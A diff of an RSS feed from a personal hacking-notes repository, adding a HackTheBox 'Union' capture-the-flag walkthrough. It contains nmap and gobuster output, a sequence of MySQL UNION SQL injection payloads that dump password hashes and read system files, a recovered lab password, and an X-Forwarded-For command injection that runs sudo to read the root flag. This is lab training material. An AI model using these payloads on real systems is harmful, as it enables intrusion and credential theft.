@@ -7,8 +7,8 @@
 		<copyright>© Nathan Acks</copyright>
 		<language>en-us</language>
 		<atom:link href="https://github.com/cardboard-iguana/hacking-notes/raw/main/feed.rss" rel="self" type="application/rss+xml" />
-		<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
-		<lastBuildDate>Wed, 19 Apr 2023 14:31:45 +0000</lastBuildDate>
+		<pubDate>Fri, 28 Apr 2023 04:59:34 +0000</pubDate>
+		<lastBuildDate>Fri, 28 Apr 2023 04:59:34 +0000</lastBuildDate>
 		<item>
 			<title>Use a Raspberry Pi 4B as an iPad Pro Hacking Accessory</title>
 			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20a%20Raspberry%20Pi%204B%20as%20an%20iPad%20Pro%20Hacking%20Accessory.md</link>
@@ -5103,6 +5103,184 @@ impersonate_token $DOMAIN\\$USER
 &lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;&amp;amp;read;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the added !DOCTYPE declaration &lt;em&gt;doesn't&lt;/em&gt; have to correspond to the !DOCTYPE the server is using (since these definitions are concatenated). So don't spend too much time coming up with a !DOCTYPE in order to define your !ENTITY - any &quot;garbage&quot; !DOCTYPE will do.&lt;/p&gt;&lt;p&gt;This basically strikes me as more-or-less the same thing as an injection attack, just that we're targeting the XML parser rather than the website code.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://xmlwriter.net/xml_guide/entity_declaration.shtml&quot;&gt;ENTITY Declaration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;remote-code-execution&quot;&gt;Remote Code Execution&lt;/h2&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; you're dealing with PHP, and &lt;em&gt;if&lt;/em&gt; the PHP expect module is loaded, and &lt;em&gt;if&lt;/em&gt; XML inputs aren't properly sanitized, then defining a SYSTEM entity with the value of &lt;code&gt;expect://$COMMAND&lt;/code&gt; will get you RCE!&lt;/p&gt;</description>
 			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
 			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/XXE%20%28XML%20External%20Entity%29%20Attacks.md</guid>
+		</item>
+		<item>
+			<title>HackTheBox Night: Union</title>
+			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Union.md</link>
+			<description>&lt;p&gt;&lt;strong&gt;machine:&lt;/strong&gt; &lt;a href=&quot;https://app.hackthebox.com/machines/418&quot;&gt;https://app.hackthebox.com/machines/418&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;I joined the Discord server ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and &lt;em&gt;then&lt;/em&gt; re-download the &lt;code&gt;.ovpn&lt;/code&gt; file), and then didn’t have the right invite link!&lt;/p&gt;&lt;p&gt;Anyways, this was my first box in a &lt;em&gt;long&lt;/em&gt; time, and boy am I rusty!&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;The target IP is 10.129.202.139 (at least initially). The &lt;code&gt;index.php&lt;/code&gt; page seems to accept any input (&lt;code&gt;player=foo&lt;/code&gt;), and directs the “player” to the &lt;code&gt;challenge.php&lt;/code&gt; page. There’s a single-element form here, but it doesn’t seem to do anything on submission (&lt;code&gt;flag=bar&lt;/code&gt;)?&lt;/p&gt;&lt;p&gt;Running &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;&lt;code&gt;gobuster&lt;/code&gt;&lt;/a&gt; to try to enumerate potentially common directories:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; -t 50 dir -u http://10.129.202.139 -w /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/css       → /css/
+/index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not much help there. Let’s try the same thing with some common extensions:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; -t 50 dir -u http://10.129.202.139 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
+&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
+&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-x&lt;/span&gt; .php,.html,.htm,.txt,.md,.js,.css&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/config.php
+/css          → /css/
+/firewall.php
+/index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://www.freecodecamp.org/news/gobuster-tutorial-find-hidden-directories-sub-domains-and-s3-buckets/&quot;&gt;A general reminder about how to use gobuster.&lt;/a&gt;&lt;/p&gt;&lt;p&gt;The &lt;code&gt;/config.php&lt;/code&gt; and &lt;code&gt;/firewall.php&lt;/code&gt; files look interesting!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/config.php&lt;/code&gt; just returns a zero-length document. Booo!&lt;/li&gt;&lt;li&gt;&lt;code&gt;/firewall.php&lt;/code&gt; just returns &lt;code&gt;Access Denied&lt;/code&gt; .&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Alright, let’s try &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;nmap&lt;/a&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oN union -Pn -A --reason -T4 -p- 10.129.202.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 19:24 MDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 19:24
+Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
+Initiating SYN Stealth Scan at 19:24
+Scanning 10.129.202.139 [65535 ports]
+Discovered open port 80/tcp on 10.129.202.139
+SYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)
+SYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)
+Completed SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)
+Initiating Service scan at 19:25
+Scanning 1 service on 10.129.202.139
+Completed Service scan at 19:26, 6.12s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 10.129.202.139
+Retrying OS detection (try #2) against 10.129.202.139
+Initiating Traceroute at 19:26
+Completed Traceroute at 19:26, 0.07s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 19:26
+Completed Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed
+NSE: Script scanning 10.129.202.139.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 5.07s elapsed
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.22s elapsed
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Nmap scan report for 10.129.202.139
+Host is up, received user-set (0.058s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|http-server-header: nginx/1.18.0 (Ubuntu)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   63.08 ms 10.10.14.1
+2   63.24 ms 10.129.202.139
+
+NSE: Script Post-scanning.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.94 seconds
+           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well, that’s less than helpful; we already knew that there was a web server running on port 80 (and there’s nothing else).&lt;/p&gt;&lt;p&gt;Okay, let’s try fuzzing the two pages with Burp Suite and see what we get! Interesting observations...&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/index.php&lt;/code&gt;&lt;ol&gt;&lt;li&gt;Submitting hexadecimal numbers for &lt;code&gt;player&lt;/code&gt; (for example, 0x0 or 0xabad1dea) result in only the &lt;em&gt;first&lt;/em&gt; half of the normal response, without any HTML or the &lt;code&gt;/challenge.php&lt;/code&gt; link.&lt;/li&gt;&lt;li&gt;You can insert any HTML you’d like, and it gets rendered back in the page.&lt;/li&gt;&lt;li&gt;Inputs always seem to be lower-cased before they’re returned.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' OR 1=1 -- 1&lt;/code&gt; and &lt;code&gt;' OR '1'='1&lt;/code&gt; are &lt;em&gt;also&lt;/em&gt; missing the second half of the response, like the 0x numbers. So maybe we have &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/SQL%20Injection.md&quot;&gt;SQL injection&lt;/a&gt;?&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;/challenge.php&lt;/code&gt; returns nothing interesting...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(I really need a more targeted fuzzing list than the “big list of naughty strings”, as the free version of Burp Suite throttles Intruder so much that this list takes over 30 minutes to process!)&lt;/p&gt;&lt;p&gt;(Also, be sure to look at the response in &lt;strong&gt;Raw&lt;/strong&gt; mode to avoid going down bunny trails about formatting changes that ​&lt;em&gt;don’t actually exist in the server response&lt;/em&gt;​!)&lt;/p&gt;&lt;p&gt;Okay, so not many clues at this point. SQL injection &lt;em&gt;might&lt;/em&gt; be a thing, but the behavior with hexadecimal numbers is... Odd.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;So, here I’m going to “cheat” a bit. I know from the discussion on Discord that SQL injection &lt;em&gt;is&lt;/em&gt; a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, I’m going to go that route.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Since &lt;code&gt;' OR 1=1 -- 1&lt;/code&gt; gave us something interesting, let’s send &lt;code&gt;/index.php&lt;/code&gt; to Repeater and see what some other values for &lt;code&gt;player&lt;/code&gt; do for us...&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT '&amp;gt;&amp;gt;&amp;gt;STUFF&amp;lt;&amp;lt;&amp;lt;' -- 1&lt;/code&gt; returns &lt;code&gt;&amp;gt;&amp;gt;&amp;gt;STUFF&amp;lt;&amp;lt;&amp;lt;&lt;/code&gt; for the user name!&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT @@datadir -- 1&lt;/code&gt; returns &lt;code&gt;/var/lib/mysql&lt;/code&gt; , so we’re dealing with MySQL.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT schema_name FROM information_schema.schemata -- 1&lt;/code&gt; returns &lt;code&gt;mysql&lt;/code&gt; ... Which isn’t right. It looks like only a single row (probably the last one, given that we only see one row with &lt;code&gt;UNION&lt;/code&gt; ) is returned.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; also returns &lt;code&gt;mysql&lt;/code&gt; ... But using &lt;code&gt;OFFSET 1&lt;/code&gt; returns &lt;code&gt;information_schema&lt;/code&gt; , so I guess we’ll just do it this way. Iterating, we also see databases called &lt;code&gt;performance_schema&lt;/code&gt; , &lt;code&gt;sys&lt;/code&gt; , and &lt;code&gt;november&lt;/code&gt; . All of these are standard MySQL databases except for &lt;code&gt;november&lt;/code&gt; .&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT database() -- 1&lt;/code&gt; confirms that we’re in the &lt;code&gt;november&lt;/code&gt; database.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT table_name FROM information_schema.tables WHERE table_schema != 'november' LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; returns &lt;code&gt;flag&lt;/code&gt; , and iterating reveals a second table &lt;code&gt;players&lt;/code&gt; . There doesn’t seem to be anything else. The &lt;code&gt;flag&lt;/code&gt; table looks promising, so let’s see what’s there.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT column_name FROM information_schema.columns WHERE table_schema = 'november' and table_name = 'flag' LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) reveals that there’s a single column called &lt;code&gt;one&lt;/code&gt; .&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT COUNT(*) FROM flag -- 1&lt;/code&gt; reveals that there’s only a single row in &lt;code&gt;flag&lt;/code&gt; . Easy!&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT one FROM flag -- 1&lt;/code&gt; then provides a “flag” value.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;(The above is made possible using &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot;&gt;this handy SQL injection cheat-sheet for MySQL&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;Now, as it turns out, this is &lt;em&gt;not&lt;/em&gt; a flag for the box! Instead, inputting it into &lt;code&gt;/challenge.php&lt;/code&gt; generates the message that &lt;code&gt;Your IP Address has now been granted SSH Access&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Let’s confirm...&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oN union2 -Pn -A --reason -T4 -p- 10.129.202.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:16 MDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 21:16
+Completed NSE at 21:16, 0.00s elapsed
+Initiating NSE at 21:16
+Completed NSE at 21:16, 0.00s elapsed
+Initiating NSE at 21:16
+Completed NSE at 21:16, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 21:16
+Completed Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed
+Initiating SYN Stealth Scan at 21:16
+Scanning 10.129.202.139 [65535 ports]
+Discovered open port 22/tcp on 10.129.202.139
+Discovered open port 80/tcp on 10.129.202.139
+Completed SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)
+Initiating Service scan at 21:17
+Scanning 2 services on 10.129.202.139
+Completed Service scan at 21:17, 6.12s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.129.202.139
+Retrying OS detection (try #2) against 10.129.202.139
+Retrying OS detection (try #3) against 10.129.202.139
+Retrying OS detection (try #4) against 10.129.202.139
+Retrying OS detection (try #5) against 10.129.202.139
+Initiating Traceroute at 21:17
+Completed Traceroute at 21:17, 0.06s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 21:17
+Completed Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed
+NSE: Script scanning 10.129.202.139.
+Initiating NSE at 21:17
+Completed NSE at 21:17, 1.73s elapsed
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.27s elapsed
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.02s elapsed
+Nmap scan report for 10.129.202.139
+Host is up, received user-set (0.054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
+|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
+|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
+| http-methods:
+|  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD
+OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS
+OS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M
+OS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
+OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
+OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
+OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
+OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
+OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
+OS:=40%CD=S)
+
+Uptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=256 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT      ADDRESS
+1   56.02 ms 10.10.14.1
+2   56.12 ms 10.129.202.139
+
+NSE: Script Post-scanning.
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.00s elapsed
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.00s elapsed
+Initiating NSE at 21:17
+Completed NSE at 21:17, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
+           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we definitely have an open SSH port now! But what user to use?&lt;/p&gt;&lt;p&gt;Maybe there’s password re-use with MySQL? Let’s see what we’ve got:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT COUNT(*) FROM mysql.user -- 1&lt;/code&gt; shows that we have 6 users.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1&lt;/code&gt; (and iterating) shows that these users are &lt;code&gt;debian-sys-maint&lt;/code&gt;, &lt;code&gt;mysql.infoschema&lt;/code&gt;, &lt;code&gt;mysql.session&lt;/code&gt;, &lt;code&gt;mysql.sys&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, and &lt;code&gt;uhc&lt;/code&gt;. Both &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;uhc&lt;/code&gt; look promising.&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT host FROM mysql.user WHERE user = 'root' -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) shows that both are permitted to login from &lt;code&gt;localhost&lt;/code&gt; (though that may not mean anything, since this is just database access).&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT authentication_string FROM mysql.user WHERE user = 'root' -- 1&lt;/code&gt; (and &lt;code&gt;uhc&lt;/code&gt;) reveals that &lt;code&gt;root&lt;/code&gt; &lt;em&gt;doesn’t&lt;/em&gt; have a password, but &lt;code&gt;uhc&lt;/code&gt; has the password hash &lt;code&gt;$A$005$fqzRyy_GvC%I&quot;Ud!F3Z3eO0EhsyqGcOsJRT9yyY2rX68rfr78QxWqRyR9tb2&lt;/code&gt;. (Apparently there’s no &lt;code&gt;password&lt;/code&gt; column in the &lt;code&gt;mysql.users&lt;/code&gt; table anymore; it’s now called &lt;code&gt;authentication_string&lt;/code&gt; per &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db&quot;&gt;the documentation&lt;/a&gt;.)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Unfortunately, it turns out that we can’t just feed this hash into &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20John%20the%20Ripper.md&quot;&gt;&lt;code&gt;john&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hashcat.md&quot;&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/a&gt;, but need to &lt;a href=&quot;https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/&quot;&gt;massage things a bit first&lt;/a&gt;.&lt;/p&gt;&lt;ol&gt;&lt;li&gt;First, we use ​&lt;code&gt;' UNION SELECT CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) FROM mysql.user WHERE user = 'uhc'&lt;/code&gt;​ to get a string that &lt;code&gt;hashcat&lt;/code&gt; can handle: ​&lt;code&gt;$mysql$A$005*66717A5279795F47760843251049172255642146*335A33654F30456873797147634F734A525439797959327258363872667237385178577152795239746232&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Then we run &lt;code&gt;hashcat -m 7401 -O hash.txt rockyou.txt&lt;/code&gt;.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;But, this is going to take a loooong time... So, I tried a few other things:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;There’s 6 users in the &lt;code&gt;players&lt;/code&gt; table, but none of them work as passwords (or alternate user names).&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT LOAD_FILE('/etc/passwd') -- 1&lt;/code&gt; displays the password file, but I can’t access &lt;code&gt;/etc/shadow&lt;/code&gt;, so it doesn’t look like we’re running as root.&lt;/li&gt;&lt;li&gt;But we can look at other files, including &lt;code&gt;/config.php&lt;/code&gt;! And it turns out that there’s a cleartext password there that we can read with &lt;code&gt;' UNION SELECT LOAD_FILE('/var/www/html/config.php') -- 1&lt;/code&gt; : &lt;code&gt;uhc-11qual-global-pw&lt;/code&gt;. ​&lt;em&gt;This works to log in as the &lt;code&gt;uhc&lt;/code&gt; user!&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The &lt;strong&gt;first flag&lt;/strong&gt; is then in the &lt;code&gt;user.txt&lt;/code&gt; file in &lt;code&gt;/home/uhc&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Unfortunately, &lt;code&gt;uhc&lt;/code&gt; isn’t in the &lt;code&gt;sudoers&lt;/code&gt; file, and there’s no obviously vulnerably SUID binaries or files with loose permissions.&lt;/p&gt;&lt;p&gt;But...&lt;/p&gt;&lt;p&gt;If you run &lt;code&gt;' UNION SELECT LOAD_FILE('/var/www/html/firewall.php') -- 1&lt;/code&gt; , you’ll see that the &lt;em&gt;web server&lt;/em&gt; has sudo access, and uses it to make a call to &lt;code&gt;iptables&lt;/code&gt; using the value of either the &lt;code&gt;X-Forwarded-For&lt;/code&gt; or &lt;code&gt;Remote-Host&lt;/code&gt; headers. And since this call is just a concatenation of the value of this header wrapped in PHP’s &lt;code&gt;system()&lt;/code&gt; call, that means &lt;em&gt;I&lt;/em&gt; can insert whatever I want. For example, setting&lt;/p&gt;&lt;pre class=&quot;http&quot;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lists the contents of the &lt;code&gt;/root&lt;/code&gt; directory, revealing the standard &lt;code&gt;/root/root.txt&lt;/code&gt; flag file. And thus&lt;/p&gt;&lt;pre class=&quot;http&quot;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will return the contents of that file.&lt;/p&gt;&lt;p&gt;Which just so happens to be the ​&lt;strong&gt;second flag&lt;/strong&gt;​.&lt;/p&gt;&lt;p&gt;(Really, I &lt;em&gt;should&lt;/em&gt; have used this trick to get both flags...)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 04:06&lt;/p&gt;</description>
+			<pubDate>Fri, 28 Apr 2023 04:59:34 +0000</pubDate>
+			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Union.md</guid>
 		</item>
 	</channel>
 </rss>
